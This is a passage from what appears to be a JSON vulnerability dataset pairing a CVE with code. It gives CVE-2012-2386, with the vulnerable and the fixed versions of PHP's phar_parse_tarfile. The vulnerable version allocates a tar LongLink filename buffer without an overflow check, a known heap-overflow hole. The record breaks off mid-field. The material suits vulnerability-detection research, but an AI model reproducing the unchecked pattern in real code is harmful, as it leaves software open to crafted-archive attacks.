                "\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);",
                "\t\t\t\t}",
                "\t\t\t\tphp_stream_close(fp);",
                "\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);",
                "\t\t\t\treturn FAILURE;",
                "\t\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2386",
        "func_name": "php/php-src/phar_parse_tarfile",
        "description": "Integer overflow in the phar_parse_tarfile function in tar.c in the phar extension in PHP before 5.3.14 and 5.4.x before 5.4.4 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted tar file that triggers a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/a10e778bfb7ce9caa1f91666ddf2705db7982d68",
        "commit_title": "fix bug #61065",
        "commit_text": "",
        "func_before": "int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */\n{\n\tchar buf[512], *actual_alias = NULL, *p;\n\tphar_entry_info entry = {0};\n\tsize_t pos = 0, read, totalsize;\n\ttar_header *hdr;\n\tphp_uint32 sum1, sum2, size, old;\n\tphar_archive_data *myphar, **actual;\n\tint last_was_longlink = 0;\n\n\tif (error) {\n\t\t*error = NULL;\n\t}\n\n\tphp_stream_seek(fp, 0, SEEK_END);\n\ttotalsize = php_stream_tell(fp);\n\tphp_stream_seek(fp, 0, SEEK_SET);\n\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\tif (read != sizeof(buf)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is not a tar file or is truncated\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\treturn FAILURE;\n\t}\n\n\thdr = (tar_header*)buf;\n\told = (memcmp(hdr->magic, \"ustar\", sizeof(\"ustar\")-1) != 0);\n\n\tmyphar = (phar_archive_data *) pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\tmyphar->is_persistent = PHAR_G(persist);\n\t/* estimate number of entries, can't be certain with tar files */\n\tzend_hash_init(&myphar->manifest, 2 + (totalsize >> 12),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->virtual_dirs, 4 + (totalsize >> 11),\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tmyphar->is_tar = 1;\n\t/* remember whether this entire phar was compressed with gz/bzip2 */\n\tmyphar->flags = compression;\n\n\tentry.is_tar = 1;\n\tentry.is_crc_checked = 1;\n\tentry.phar = myphar;\n\tpos += sizeof(buf);\n\n\tdo {\n\t\tphar_entry_info *newentry;\n\n\t\tpos = php_stream_tell(fp);\n\t\thdr = (tar_header*) buf;\n\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\tbreak;\n\t\t}\n\t\tmemset(hdr->checksum, ' ', sizeof(hdr->checksum));\n\t\tsum2 = phar_tar_checksum(buf, old?sizeof(old_tar_header):sizeof(tar_header));\n\n\t\tsize = entry.uncompressed_filesize = entry.compressed_filesize =\n\t\t\tphar_tar_number(hdr->size, sizeof(hdr->size));\n\n\t\tif (((!old && hdr->prefix[0] == 0) || old) && strlen(hdr->name) == sizeof(\".phar/signature.bin\")-1 && !strncmp(hdr->name, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\toff_t curloc;\n\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has signature that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\nbail:\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcurloc = php_stream_tell(fp);\n\t\t\tread = php_stream_read(fp, buf, size);\n\t\t\tif (read != size) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be read\", fname);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n#ifdef WORDS_BIGENDIAN\n# define PHAR_GET_32(buffer) \\\n\t(((((unsigned char*)(buffer))[3]) << 24) \\\n\t\t| ((((unsigned char*)(buffer))[2]) << 16) \\\n\t\t| ((((unsigned char*)(buffer))[1]) <<  8) \\\n\t\t| (((unsigned char*)(buffer))[0]))\n#else\n# define PHAR_GET_32(buffer) (php_uint32) *(buffer)\n#endif\n\t\t\tmyphar->sig_flags = PHAR_GET_32(buf);\n\t\t\tif (FAILURE == phar_verify_signature(fp, php_stream_tell(fp) - size - 512, myphar->sig_flags, buf + 8, size - 8, fname, &myphar->signature, &myphar->sig_len, error TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save = *error;\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be verified: %s\", fname, save);\n\t\t\t\t\tefree(save);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tphp_stream_seek(fp, curloc + 512, SEEK_SET);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\t\tphp_stream_seek(fp, 512, SEEK_CUR);\n\t\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\thdr = (tar_header*) buf;\n\t\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\n\t\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" has entries after signature, invalid phar\", fname);\n\t\t\t}\n\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (!last_was_longlink && hdr->typeflag == 'L') {\n\t\t\tlast_was_longlink = 1;\n\t\t\t/* support the ././@LongLink system for storing long filenames */\n\t\t\tentry.filename_len = entry.uncompressed_filesize;\n\t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n\n\t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);\n\t\t\tif (read != entry.filename_len) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\t\t/* skip blank stuff */\n\t\t\tsize = ((size+511)&~511) - size;\n\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\t\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcontinue;\n\t\t} else if (!last_was_longlink && !old && hdr->prefix[0] != 0) {\n\t\t\tchar name[256];\n\t\t\tint i, j;\n\n\t\t\tfor (i = 0; i < 155; i++) {\n\t\t\t\tname[i] = hdr->prefix[i];\n\t\t\t\tif (name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tname[i++] = '/';\n\t\t\tfor (j = 0; j < 100; j++) {\n\t\t\t\tname[i+j] = hdr->name[j];\n\t\t\t\tif (name[i+j] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tentry.filename_len = i+j;\n\n\t\t\tif (name[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t\tentry.filename = pestrndup(name, entry.filename_len, myphar->is_persistent);\n\t\t} else if (!last_was_longlink) {\n\t\t\tint i;\n\n\t\t\t/* calculate strlen, which can be no longer than 100 */\n\t\t\tfor (i = 0; i < 100; i++) {\n\t\t\t\tif (hdr->name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tentry.filename_len = i;\n\t\t\tentry.filename = pestrndup(hdr->name, i, myphar->is_persistent);\n\n\t\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename[entry.filename_len - 1] = '\\0';\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t}\n\t\tlast_was_longlink = 0;\n\n\t\tphar_add_virtual_dirs(myphar, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (sum1 != sum2) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (checksum mismatch of file \\\"%s\\\")\", fname, entry.filename);\n\t\t\t}\n\t\t\tpefree(entry.filename, myphar->is_persistent);\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tentry.tar_type = ((old & (hdr->typeflag == '\\0')) ? TAR_FILE : hdr->typeflag);\n\t\tentry.offset = entry.offset_abs = pos; /* header_offset unused in tar */\n\t\tentry.fp_type = PHAR_FP;\n\t\tentry.flags = phar_tar_number(hdr->mode, sizeof(hdr->mode)) & PHAR_ENT_PERM_MASK;\n\t\tentry.timestamp = phar_tar_number(hdr->mtime, sizeof(hdr->mtime));\n\t\tentry.is_persistent = myphar->is_persistent;\n#ifndef S_ISDIR\n#define S_ISDIR(mode)\t(((mode)&S_IFMT) == S_IFDIR)\n#endif\n\t\tif (old && entry.tar_type == TAR_FILE && S_ISDIR(entry.flags)) {\n\t\t\tentry.tar_type = TAR_DIR;\n\t\t}\n\n\t\tif (entry.tar_type == TAR_DIR) {\n\t\t\tentry.is_dir = 1;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tentry.link = NULL;\n\n\t\tif (entry.tar_type == TAR_LINK) {\n\t\t\tif (!zend_hash_exists(&myphar->manifest, hdr->linkname, strlen(hdr->linkname))) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file - hard link to non-existent file \\\"%s\\\"\", fname, hdr->linkname);\n\t\t\t\t}\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t} else if (entry.tar_type == TAR_SYMLINK) {\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t}\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&myphar->manifest, entry.filename, entry.filename_len, (void*)&entry, sizeof(phar_entry_info), (void **) &newentry);\n\n\t\tif (entry.is_persistent) {\n\t\t\t++entry.manifest_pos;\n\t\t}\n\n\t\tif (entry.filename_len >= sizeof(\".phar/.metadata\")-1 && !memcmp(entry.filename, \".phar/.metadata\", sizeof(\".phar/.metadata\")-1)) {\n\t\t\tif (FAILURE == phar_tar_process_metadata(newentry, fp TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has invalid metadata in magic file \\\"%s\\\"\", fname, entry.filename);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\t/* found explicit alias */\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has alias that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, size);\n\n\t\t\tif (read == size) {\n\t\t\t\tbuf[size] = '\\0';\n\t\t\t\tif (!phar_validate_alias(buf, size)) {\n\t\t\t\t\tif (size > 50) {\n\t\t\t\t\t\tbuf[50] = '.';\n\t\t\t\t\t\tbuf[51] = '.';\n\t\t\t\t\t\tbuf[52] = '.';\n\t\t\t\t\t\tbuf[53] = '\\0';\n\t\t\t\t\t}\n\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in tar-based phar \\\"%s\\\"\", buf, fname);\n\t\t\t\t\t}\n\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tactual_alias = pestrndup(buf, size, myphar->is_persistent);\n\t\t\t\tmyphar->alias = actual_alias;\n\t\t\t\tmyphar->alias_len = size;\n\t\t\t\tphp_stream_seek(fp, pos, SEEK_SET);\n\t\t\t} else {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to read alias from tar-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tsize = (size+511)&~511;\n\n\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\tif (read != sizeof(buf)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t}\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\t} while (read != 0);\n\n\tif (zend_hash_exists(&(myphar->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmyphar->is_data = 0;\n\t} else {\n\t\tmyphar->is_data = 1;\n\t}\n\n\t/* ensure signature set */\n\tif (!myphar->is_data && PHAR_G(require_hash) && !myphar->signature) {\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\tif (error) {\n\t\t\tspprintf(error, 0, \"tar-based phar \\\"%s\\\" does not have a signature\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\tmyphar->fname = pestrndup(fname, fname_len, myphar->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(myphar->fname, fname_len);\n#endif\n\tmyphar->fname_len = fname_len;\n\tmyphar->fp = fp;\n\tp = strrchr(myphar->fname, '/');\n\n\tif (p) {\n\t\tmyphar->ext = memchr(p, '.', (myphar->fname + fname_len) - p);\n\t\tif (myphar->ext == p) {\n\t\t\tmyphar->ext = memchr(p + 1, '.', (myphar->fname + fname_len) - p - 1);\n\t\t}\n\t\tif (myphar->ext) {\n\t\t\tmyphar->ext_len = (myphar->fname + fname_len) - myphar->ext;\n\t\t}\n\t}\n\n\tphar_request_initialize(TSRMLS_C);\n\n\tif (SUCCESS != zend_hash_add(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len, (void*)&myphar, sizeof(phar_archive_data*), (void **)&actual)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\" to phar registry\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\treturn FAILURE;\n\t}\n\n\tmyphar = *actual;\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tmyphar->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, myphar->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t\t\tmyphar->alias = pestrndup(alias, alias_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = alias_len;\n\t\t} else {\n\t\t\tmyphar->alias = pestrndup(myphar->fname, fname_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = fname_len;\n\t\t}\n\n\t\tmyphar->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = myphar;\n\t}\n\n\treturn SUCCESS;\n}",
        "func": "int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */\n{\n\tchar buf[512], *actual_alias = NULL, *p;\n\tphar_entry_info entry = {0};\n\tsize_t pos = 0, read, totalsize;\n\ttar_header *hdr;\n\tphp_uint32 sum1, sum2, size, old;\n\tphar_archive_data *myphar, **actual;\n\tint last_was_longlink = 0;\n\n\tif (error) {\n\t\t*error = NULL;\n\t}\n\n\tphp_stream_seek(fp, 0, SEEK_END);\n\ttotalsize = php_stream_tell(fp);\n\tphp_stream_seek(fp, 0, SEEK_SET);\n\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\tif (read != sizeof(buf)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is not a tar file or is truncated\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\treturn FAILURE;\n\t}\n\n\thdr = (tar_header*)buf;\n\told = (memcmp(hdr->magic, \"ustar\", sizeof(\"ustar\")-1) != 0);\n\n\tmyphar = (phar_archive_data *) pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\tmyphar->is_persistent = PHAR_G(persist);\n\t/* estimate number of entries, can't be certain with tar files */\n\tzend_hash_init(&myphar->manifest, 2 + (totalsize >> 12),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->virtual_dirs, 4 + (totalsize >> 11),\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tmyphar->is_tar = 1;\n\t/* remember whether this entire phar was compressed with gz/bzip2 */\n\tmyphar->flags = compression;\n\n\tentry.is_tar = 1;\n\tentry.is_crc_checked = 1;\n\tentry.phar = myphar;\n\tpos += sizeof(buf);\n\n\tdo {\n\t\tphar_entry_info *newentry;\n\n\t\tpos = php_stream_tell(fp);\n\t\thdr = (tar_header*) buf;\n\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\tbreak;\n\t\t}\n\t\tmemset(hdr->checksum, ' ', sizeof(hdr->checksum));\n\t\tsum2 = phar_tar_checksum(buf, old?sizeof(old_tar_header):sizeof(tar_header));\n\n\t\tsize = entry.uncompressed_filesize = entry.compressed_filesize =\n\t\t\tphar_tar_number(hdr->size, sizeof(hdr->size));\n\n\t\tif (((!old && hdr->prefix[0] == 0) || old) && strlen(hdr->name) == sizeof(\".phar/signature.bin\")-1 && !strncmp(hdr->name, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\toff_t curloc;\n\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has signature that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\nbail:\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcurloc = php_stream_tell(fp);\n\t\t\tread = php_stream_read(fp, buf, size);\n\t\t\tif (read != size) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be read\", fname);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n#ifdef WORDS_BIGENDIAN\n# define PHAR_GET_32(buffer) \\\n\t(((((unsigned char*)(buffer))[3]) << 24) \\\n\t\t| ((((unsigned char*)(buffer))[2]) << 16) \\\n\t\t| ((((unsigned char*)(buffer))[1]) <<  8) \\\n\t\t| (((unsigned char*)(buffer))[0]))\n#else\n# define PHAR_GET_32(buffer) (php_uint32) *(buffer)\n#endif\n\t\t\tmyphar->sig_flags = PHAR_GET_32(buf);\n\t\t\tif (FAILURE == phar_verify_signature(fp, php_stream_tell(fp) - size - 512, myphar->sig_flags, buf + 8, size - 8, fname, &myphar->signature, &myphar->sig_len, error TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save = *error;\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be verified: %s\", fname, save);\n\t\t\t\t\tefree(save);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tphp_stream_seek(fp, curloc + 512, SEEK_SET);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\t\tphp_stream_seek(fp, 512, SEEK_CUR);\n\t\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\thdr = (tar_header*) buf;\n\t\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\n\t\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" has entries after signature, invalid phar\", fname);\n\t\t\t}\n\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (!last_was_longlink && hdr->typeflag == 'L') {\n\t\t\tlast_was_longlink = 1;\n\t\t\t/* support the ././@LongLink system for storing long filenames */\n\t\t\tentry.filename_len = entry.uncompressed_filesize;\n\n\t\t\t/* Check for overflow - bug 61065 */\n\t\t\tif (entry.filename_len == UINT_MAX) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n\n\t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);\n\t\t\tif (read != entry.filename_len) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\t\t/* skip blank stuff */\n\t\t\tsize = ((size+511)&~511) - size;\n\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\t\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcontinue;\n\t\t} else if (!last_was_longlink && !old && 